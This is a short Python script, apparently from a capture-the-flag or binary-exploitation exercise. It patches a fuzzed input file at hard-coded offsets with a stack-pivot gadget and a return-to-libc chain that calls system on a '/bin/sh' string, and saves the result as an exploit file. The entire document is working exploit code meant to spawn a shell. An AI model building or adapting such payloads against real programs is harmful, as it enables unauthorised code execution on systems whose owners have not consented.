import struct
with open('SAM-fuzzed-235209', 'rb') as fd:
    data = fd.read()
#nd = data[:13068]+struct.pack('<I', 0x804e5e0)+data[13072:]
pop_esp = 0x0804e5fa
nd = data[:13068]+struct.pack('<I', pop_esp)+data[13072:]
plt_system = 0x08048630
_binsh = 0x0804e9de
nd = nd[:0x31fc]+struct.pack('<I', plt_system)+struct.pack('<I', 0xdeadbeef)+struct.pack('<I', _binsh)+nd[0x3208:]

with open('exp', 'wb') as fd:
    fd.write(nd)
